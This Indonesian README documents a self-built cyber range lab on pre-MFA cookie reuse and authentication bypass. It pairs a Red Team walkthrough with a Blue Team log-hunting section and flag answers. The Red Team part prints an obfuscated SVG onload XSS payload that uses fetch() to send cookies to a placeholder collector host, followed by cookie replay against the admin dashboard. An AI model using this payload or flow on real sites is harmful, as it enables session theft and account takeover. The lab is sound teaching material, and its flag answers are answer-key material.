# SCENARIO75 - Cookie Reuse and MFA Bypass Lab

**Nama Pembuat:** Asyam Adithakarya Erdi Pribadi  
**Tanggal Pembuatan:** Jumat, 9 Oktober 2026

Repository ini berisi recap dari SCENARIO75 cyber range lab yang saya bangun untuk assignment Red Team dan Blue Team. Tujuan lab ini adalah membangun environment yang aman, mudah di-deploy dalam satu Linux VM, menjalankan simulasi attack path dari sisi Red Team, lalu melakukan investigasi aktivitas yang sama dari sisi Blue Team.

Lab ini sengaja dibuat memiliki kelemahan keamanan untuk kebutuhan pembelajaran dan pembuktian skenario. Semua pengujian dilakukan di local VM / local lab network yang terkontrol. Tidak ada sistem publik atau third-party target yang dilibatkan.

## Lab Overview

Skenario yang dibangun adalah Admin Feedback System dengan session handling yang lemah. Red Team Path menunjukkan bagaimana pre-MFA cookie dapat digunakan ulang untuk mengakses dashboard admin. Blue Team Path berfokus pada pembacaan `access.log` dan `error.log`, identifikasi aktivitas attacker, serta penelusuran ulang bukti dari log trail.

| Komponen | Penggunaan | Port |
|---|---|---|
| `app` | Vulnerable Node.js Admin Feedback System | `3075` |
| `ssh-blue` | Blue Team analysis box dengan akses ke lab logs | `2275` |
| `log-injector` | Men-generate realistic attack timeline untuk kebutuhan analisis | n/a |

Semua service berjalan melalui Docker Compose dalam satu jaringan internal Docker. Aplikasi menggunakan internal alias `feedback.admin.local` untuk menyesuaikan skenario assignment.

```text
scenario75-lab/
├── app/
│   ├── server.js
│   ├── package.json
│   └── Dockerfile
├── ssh-blue/
│   └── Dockerfile
├── scripts/
│   ├── generate_logs.py
│   ├── Dockerfile
│   └── setup_proxmox_vm.sh
├── evidence/
│   ├── deployment/
│   ├── red-team/
│   └── blue-team/
├── docker-compose.yml
└── README.md
```

## Infrastructure & Deployment

Deployment menggunakan Ubuntu VM, seperti Proxmox guest yang terhubung ke internal lab network. Spesifikasi 2 vCPU dan 2 GB RAM sudah cukup untuk menjalankan skenario lab ini.

Menjalankan setup script dari repository root:

```bash
sudo ./scripts/setup_proxmox_vm.sh
```

Script akan menginstall Docker jika dibutuhkan, membangun lab containers, menjalankan app dan analyst SSH box, lalu menjalankan log injector satu kali.

Quick check:

```bash
curl -I http://<vm-ip>:3075/
ssh analyst@<vm-ip> -p 2275
```

Blue Team SSH credential:

```text
Username: analyst
Password: blue_team_rocks
Port: 2275
```

Blue Team logs tersedia di dalam SSH container:

```text
/opt/admin/logs/access.log
/opt/admin/logs/error.log
```

Untuk mengisi ulang logs setelah clearing:

```bash
docker compose run --rm log-injector
```

## Red Team Path Recap

Red Team Path dimulai dari basic reconnaissance, menemukan exposed pre-MFA session cookie, menanam XSS payload melalui feedback form, lalu menggunakan ulang cookie tersebut untuk mengakses `/dashboard`.

| Step | Red Team Checked | Evidence / Flag |
|---|---|---|
| 1 | Read the response headers from the app | `SCENARIO75{Node.js}` |
| 2 | Checked `robots.txt` for hidden paths | `SCENARIO75{/api/verify-mfa}` |
| 3 | Reviewed the page source hint | `SCENARIO75{robots.txt}` |
| 4 | Captured the pre-MFA cookie and confirmed it was readable by JavaScript | `SCENARIO75{pre_mfa_session}`, `SCENARIO75{pending_mfa_verification}` |
| 5 | Sent a basic `<script>` payload and confirmed the WAF blocked it | `SCENARIO75{POST}`, `SCENARIO75{403}` |
| 6 | Used an SVG `onload` payload to bypass the simple filter | `SCENARIO75{<svg>}`, `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`, `SCENARIO75{fetch}` |
| 7 | Replayed the captured cookie against the admin dashboard | `SCENARIO75{/dashboard}` |
| 8 | Confirmed the dashboard loaded without calling MFA verification | `SCENARIO75{/api/verify-mfa}` |
| 9 | Confirmed the server issued an admin session cookie | `SCENARIO75{adm_sess}` |
| 10 | Found the stored payload reflected in the dashboard page | `SCENARIO75{xss-payload}` |
| 11 | Recovered the red team flag from the dashboard HTML | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |

Contoh command flow:

```bash
curl -s -c cookies.txt http://<vm-ip>:3075/ -o /dev/null

curl -s -X POST http://<vm-ip>:3075/api/feedback \
  --data-urlencode "comment=<svg onload=fetch('http://<collector-ip>/steal?c='+window['docu'+'ment']['coo'+'kie'])>"

curl -s -b cookies.txt http://<vm-ip>:3075/dashboard
```

## Blue Team Recap

Blue Team Path dimulai dari SSH analyst box dan berfokus pada log files. Langkah utama adalah membandingkan normal traffic dengan suspicious external source, lalu mengikuti timeline dari WAF block sampai akses dashboard yang berhasil.

```bash
ssh analyst@<vm-ip> -p 2275
cd /opt/admin/logs
```

| Step | Blue Team Checked | Evidence / Flag |
|---|---|---|
| 1 | Located the access and error logs | `SCENARIO75{/opt/admin/logs}` |
| 2 | Identified the attacker IP and User-Agent | `SCENARIO75{10.10.14.50}`, `SCENARIO75{Mozilla/5.0}` |
| 3 | Found the successful dashboard request | `SCENARIO75{200}`, `SCENARIO75{18:51:55}` |
| 4 | Extracted the suspicious `XFF=` field | `SCENARIO75{U0NFTkFSSU83NXtCTFUzX0wwR19IVU5UM1JfMHduM2R9}` |
| 5 | Compared it with normal admin traffic | `SCENARIO75{192.168.1.100}` |
| 6 | Mapped the attacker IP to its subnet | `SCENARIO75{10.10.14.0/24}` |
| 7 | Found the first WAF block in `error.log` | `SCENARIO75{/opt/admin/logs/error.log}`, `SCENARIO75{<script>}`, `SCENARIO75{18:50:15}` |
| 8 | Confirmed the attacker never completed `/api/verify-mfa` | `SCENARIO75{No}` |
| 9 | Identified the encoded value as Base64 | `SCENARIO75{Base64}` |
| 10 | Found the critical severity marker | `SCENARIO75{CRITICAL}` |
| 11 | Found the anomaly label | `SCENARIO75{Authentication bypass anomaly}` |
| 12 | Decoded the Blue Team flag | `SCENARIO75{BLU3_L0G_HUNT3R_0wn3d}` |

Useful commands:

```bash
grep '"GET /dashboard' access.log
grep 'XFF=' access.log | grep -oP 'XFF="\K[^"]+'
echo "U0NFTkFSSU83NXtCTFUzX0wwR19IVU5UM1JfMHduM2R9" | base64 -d
```

## Evidence

Screenshots untuk deployment, Red Team, dan Blue Team disimpan di folder `evidence/`. README ini hanya menjelaskan alur utama supaya tetap mudah dibaca, sementara bukti visual lengkap tetap tersedia untuk report atau presentasi.

```text
evidence/
├── deployment/
├── red-team/
└── blue-team/
```

## Peringatan Keamanan

Project ini sengaja dibuat memiliki kelemahan keamanan untuk mendukung proses pembelajaran Red Team Path dan Blue Team Path dalam skenario assignment ini.

Penggunaan lab ini hanya untuk local network, VM pribadi, atau controlled space. Tidak diperuntukkan untuk penggunaan publik atau internet.
